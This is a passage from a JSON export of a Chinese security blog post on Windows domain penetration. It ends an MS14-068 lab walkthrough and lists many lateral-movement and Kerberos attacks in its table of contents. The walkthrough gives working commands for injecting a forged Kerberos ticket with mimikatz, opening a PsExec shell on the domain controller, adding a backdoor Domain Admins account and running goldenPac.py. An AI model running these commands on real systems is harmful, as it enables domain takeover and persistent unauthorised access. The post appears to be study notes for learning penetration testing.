08server-dc.moonsec.fbi<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915170709072.png\" alt=\"image-20220915170709072\"></p>\n<ul>\n<li>第二步：利用 mimikatz 将工具得到的 TGT 票据写入内存，创建缓存证书</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">kerberos::ptc TGT_test@moonsec.fbi.ccache<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<ul>\n<li>第三步：获取域管理员权限。创建一个 test 账号并加入域管理员组，从而随时可以登录域控主机进行操作</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">PsExec.exe \\\\08server-dc cmd.exe\n&#x2F;&#x2F; 添加test用户net user test abc123! &#x2F;add &#x2F;domain\n&#x2F;&#x2F; 把 test 用户添加进域管理员组net group &quot;domain admins&quot; test &#x2F;add &#x2F;domain\n&#x2F;&#x2F; 查看域管理员net group &quot;domain admins&quot; &#x2F;domain<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915171202299.png\" alt=\"image-20220915171202299\"></p>\n<ul>\n<li>或者使用 goldenPac.py 脚本 (python 打包 exe 执行)</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">python3 goldenPac.py -dc-ip 192.168.254.145 -target-ip 192.168.254.145 moonsec.fbi&#x2F;test:123456@08server-dc.moonsec.fbi<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"7-窃取域管理员令牌\"><a class=\"markdownIt-Anchor\" href=\"#7-窃取域管理员令牌\">#</a> 7、窃取域管理员令牌</h2>\n<ul>\n<li>学习 cs 后补充</li>\n</ul>\n<h2 id=\"8-进程迁移\"><a class=\"markdownIt-Anchor\" href=\"#8-进程迁移\">#</a> 8、进程迁移</h2>\n<ul>\n<li>学习 cs 后补充</li>\n</ul>\n","feature":true,"text":"# 域渗透 常用命令总结 klist #查看当前存储的票证 net view &#x2F;domain:domainame #查询域内主机 # 1、域基本信息、域控收集 使用 systeminfo 命令，当主机在域中时，会显示所在的域 systeminfo 使用 net time...","link":"","photos":[],"count_time":{"symbolsCount":"38k","symbolsTime":"34 mins."},"categories":[{"name":"web安全","slug":"web安全","count":4,"path":"api/categories/web安全.json"}],"tags":[{"name":"web安全","slug":"web安全","count":4,"path":"api/tags/web安全.json"},{"name":"内网渗透","slug":"内网渗透","count":3,"path":"api/tags/内网渗透.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%9F%9F%E6%B8%97%E9%80%8F\"><span class=\"toc-text\"> 域渗透</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-%E5%9F%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-%E5%9F%9F%E6%8E%A7%E6%94%B6%E9%9B%86\"><span class=\"toc-text\"> 1、域基本信息、域控收集</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0\"><span class=\"toc-text\"> 2、主机发现</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%9C%8D%E5%8A%A1\"><span class=\"toc-text\"> 3、常见端口及服务</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4-%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\"> 4、域渗透思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Ftoken\"><span class=\"toc-text\"> 5、内网渗透 Token</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#51-access-token%E7%9A%84%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8\"><span class=\"toc-text\"> 5.1 Access Token 的窃取与利用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1incognitoexe\"><span class=\"toc-text\"> 1.incognito.exe</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2msf%E4%B8%8B%E7%9A%84incognito%E6%A8%A1%E5%9D%97\"><span class=\"toc-text\"> 2…MSF 下的 incognito 模块</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3invoke-tokenmanipulationps1%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\"> 3.Invoke-TokenManipulation.ps1 脚本</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F\"><span class=\"toc-text\"> 横向渗透</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-pthpass-the-hash%E4%BC%A0%E9%80%92\"><span class=\"toc-text\"> 1、PTH (Pass The Hash) 传递</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#11-mimikatz-pth\"><span class=\"toc-text\"> 1.1 mimikatz pth</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#12-psexec\"><span class=\"toc-text\"> 1.2 psexec</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#13-msf%E7%9A%84psexec%E6%A8%A1%E5%9D%97\"><span class=\"toc-text\"> 1.3 msf 的 psexec 模块</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#14-crackmapexec-c%E6%AE%B5%E6%89%B9%E9%87%8Fpth\"><span class=\"toc-text\"> 1.4 CrackMapExec C 段批量 pth</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#15-wmi\"><span class=\"toc-text\"> 1.5 WMI</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#wmic%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E6%98%8E%E6%96%87\"><span class=\"toc-text\"> wmic 命令 —— 使用明文</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#wmiexecpy\"><span class=\"toc-text\"> wmiexec.py</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#wmiexecvbs\"><span class=\"toc-text\"> wmiexec.vbs</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#invoke-wmicommand\"><span class=\"toc-text\"> Invoke-WmiCommand</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#invoke-wmimethod\"><span class=\"toc-text\"> Invoke-WMIMethod</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#wmic%E7%9A%84%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\"> wmic 的其他命令</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-pttpass-the-ticket%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB\"><span class=\"toc-text\"> 2、PTT (Pass The Ticket) 票据传递攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#21-kerberos%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\"> 2.1 Kerberos 协议</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#22-kerberos%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86\"><span class=\"toc-text\"> 2.2 Kerberos 认证原理</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#as_req-as_rep\"><span class=\"toc-text\"> AS_REQ &amp; AS_REP</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#tgs_req-tgs_rep\"><span class=\"toc-text\"> TGS_REQ &amp; TGS_REP</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#ap_req-ap_rep\"><span class=\"toc-text\"> AP_REQ &amp; AP_REP</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#23-pac\"><span class=\"toc-text\"> 2.3 PAC</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#24-kerberos%E8%AE%A4%E8%AF%81%E4%B8%AD%E7%9A%84%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%A6%82%E8%BF%B0\"><span class=\"toc-text\"> 2.4 Kerberos 认证中的相关安全问题概述</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AEgolden-ticket\"><span class=\"toc-text\"> 黄金票据（Golden ticket）</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AEsilver-ticket\"><span class=\"toc-text\"> 白银票据（Silver ticket）</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#ms14-068\"><span class=\"toc-text\"> MS14-068</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E6%94%BB%E5%87%BBpassword-spraying\"><span class=\"toc-text\"> 密码喷洒攻击（Password Spraying）</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#as-rep-roasting\"><span class=\"toc-text\"> AS-REP Roasting</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#25-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB\"><span class=\"toc-text\"> 2.5 票据传递攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#ms14-068-2\"><span class=\"toc-text\"> MS14-068</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE\"><span class=\"toc-text\"> 黄金票据</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE\"><span class=\"toc-text\"> 白银票据</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%87%91%E7%A5%A8%E5%92%8C%E9%93%B6%E7%A5%A8%E7%9A%84%E5%8C%BA%E5%88%AB\"><span class=\"toc-text\"> 金票和银票的区别</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB\"><span class=\"toc-text\"> 域委派攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86\"><span class=\"toc-text\"> 1、域委派的相关知识</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#11-%E4%BB%80%E4%B9%88%E6%98%AF%E5%A7%94%E6%B4%BE\"><span class=\"toc-text\"> 1.1 什么是委派</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#12-%E5%A7%94%E6%B4%BE%E7%9A%84%E7%94%B1%E6%9D%A5\"><span class=\"toc-text\"> 1.2 委派的由来</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#13-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE\"><span class=\"toc-text\"> 1.3 为什么使用域委派</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#14-%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\"> 1.4 域委派流程</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#15-%E5%A7%94%E6%B4%BE%E7%9A%84%E7%94%A8%E6%88%B7\"><span class=\"toc-text\"> 1.5 委派的用户</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#16-%E4%B8%89%E7%A7%8D%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB\"><span class=\"toc-text\"> 1.6 三种委派攻击</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB\"><span class=\"toc-text\"> 2、非约束委派攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#21-%E5%9F%9F%E7%8E%AF%E5%A2%83\"><span class=\"toc-text\"> 2.1 域环境</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#22-%E9%85%8D%E7%BD%AE%E9%9D%9E%E7%BA%A6%E6%9D%9F%E4%B8%BB%E6%9C%BA%E5%92%8C%E7%94%A8%E6%88%B7\"><span class=\"toc-text\"> 2.2 配置非约束主机和用户</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#23-powershell%E6%9F%A5%E8%AF%A2%E9%9D%9E%E5%A7%94%E6%B4%BE%E7%BA%A6%E6%9D%9F\"><span class=\"toc-text\"> 2.3 powershell 查询非委派约束</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#24-adfind%E6%9F%A5%E8%AF%A2%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE\"><span class=\"toc-text\"> 2.4 adfind 查询非约束委派</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#25-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB\"><span class=\"toc-text\"> 2.5 非约束委派攻击</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#26-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BEspooler\"><span class=\"toc-text\"> 2.6 非约束委派 &amp; Spooler</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#27-spooler%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE\"><span class=\"toc-text\"> 2.7 Spooler 制作黄金票据</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB\"><span class=\"toc-text\"> 3、约束委派攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#31-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\"> 3.1 约束委派介绍</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#32-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\"> 3.2 约束委派流程</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#33-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86\"><span class=\"toc-text\"> 3.3 攻击原理</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#34-%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\"> 3.4 攻击复现</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#35-%E5%B0%8F%E7%BB%93\"><span class=\"toc-text\"> 3.5 小结</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4-%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-%E7%A9%BA\"><span class=\"toc-text\"> 4、基于资源的约束委派 # 空</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90\"><span class=\"toc-text\"> 获取域控权限</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-%E9%AB%98%E6%9D%83%E9%99%90%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81\"><span class=\"toc-text\"> 1、高权限读取本地密码</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-sysvol%E7%BB%84%E7%AD%96%E7%95%A5%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81\"><span class=\"toc-text\"> 2、SYSVOL 组策略获取密码</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-kerberoasting\"><span class=\"toc-text\"> 3、Kerberoasting</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#31-%E4%BD%BF%E7%94%A8mimikatz%E9%85%8D%E5%90%88%E8%84%9A%E6%9C%AC%E7%A9%B7%E4%B8%BE\"><span class=\"toc-text\"> 3.1 使用 mimikatz 配合脚本穷举</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#32-%E4%BD%BF%E7%94%A8hashcat%E7%A9%B7%E4%B8%BE\"><span class=\"toc-text\"> 3.2 使用 hashcat 穷举</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4-%E5%86%85%E7%BD%91%E5%8D%8F%E8%AE%AEntlm%E4%B9%8B%E5%86%85%E7%BD%91%E5%A4%A7%E6%9D%80%E5%99%A8cve-2019-1040%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\"> 4、内网协议 NTLM 之内网大杀器 CVE-2019-1040 漏洞</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5-cve-2020-1472-zerologon\"><span class=\"toc-text\"> 5、CVE-2020-1472-ZeroLogon</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#51-%E7%AE%80%E4%BB%8B\"><span class=\"toc-text\"> 5.1 简介</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#52-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC\"><span class=\"toc-text\"> 5.2 影响版本</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#53-%E5%A4%8D%E7%8E%B0zerologin%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\"> 5.3 复现：zerologin 脚本</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#54-%E6%81%A2%E5%A4%8D%E5%8E%9Fhash\"><span class=\"toc-text\"> 5.4 恢复原 hash</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#6-ms14-068%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83\"><span class=\"toc-text\"> 6、MS14-068 漏洞提权</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#61-%E7%AE%80%E4%BB%8B\"><span class=\"toc-text\"> 6.1 简介</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#62-%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\"> 6.2 复现</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#7-%E7%AA%83%E5%8F%96%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E4%BB%A4%E7%89%8C\"><span class=\"toc-text\"> 7、窃取域管理员令牌</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#8-%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB\"><span class=\"toc-text\"> 8、进程迁移</span></a></li></ol></li></ol>","author":{"name":"cCor4ng3","slug":"blog-author","avatar":"http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/53BC80F5D1388E1A7955F40466B7F050.jpg","link":"/","description":"Fight 为 · Live","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Metasploit内网篇","uid":"11f36b4318769a873345492b90cb8350","slug":"Metasploit内网篇","date":"2022-10-06T14:00:44.000Z","updated":"2022-10-06T14:01:51.809Z","comments":true,"path":"api/articles/Metasploit内网篇.json","keywords":null,"cover":"https://gss0.baidu.com/-4o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/f2deb48f8c5494ee94b313482af5e0fe98257ec9.jpg","text":"#常用命令 sessions -K 结束全部会话 # 1、数据库后端 关于数据库操作： db_connect db_disconnect db_export db_import db_nmap db_rebuild_cache db_remove db_save db_statu...","link":"","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"13 mins."},"categories":[{"name":"web安全","slug":"web安全","count":4,"path":"api/categories/web安全.json"}],"tags":[{"name":"web安全","slug":"web安全","count":4,"path":"api/tags/web安全.json"},{"name":"内网渗透","slug":"内网渗透","count":3,"path":"api/tags/内网渗透.json"}],"author":{"name":"cCor4ng3","slug":"blog-author","avatar":"http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/53BC80F5D1388E1A7955F40466B7F050.jpg","link":"/","description":"Fight 为 · Live","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"SpringMVC-更新中","uid":"a1db4bab80f4c47c78ccb67fb1a24d3b","slug":"SpringMVC","date":"2022-10-06T13:54:41.000Z","updated":"2022-10-06T13:55:43.553Z","comments":true,"path":"api/articles/SpringMVC.json","keywords":null,"cover":"https://tupian.qqw21.com/article/UploadPic/2020-4/202042322244895518.jpg","text":"# 1、SpringMVC 概述 SpringMVC 技术与 Servlet 技术功能等同，均属于 web 层开发技术 SpringMVC 是一种基于 java 实现 MVC 模型的轻量级 web 框架 优点 使用简单，开发便捷（相比于 Servlet） # 2、SpringMV...","link":"","photos":[],"count_time":{"symbolsCount":"40k","symbolsTime":"36 mins."},"categories":[{"name":"JavaWeb","slug":"JavaWeb","count":10,"path":"api/categories/JavaWeb.json"}],"tags":[{"name":"JavaWeb","slug":"JavaWeb","count":10,"path":"api/tags/JavaWeb.json"}],"author":{"name":"cCor4ng3","slug":"blog-author","avatar":"http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/53BC80F5D1388E1A7955F40466B7F050.jpg","link":"/","description":"Fight 为 · Live","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}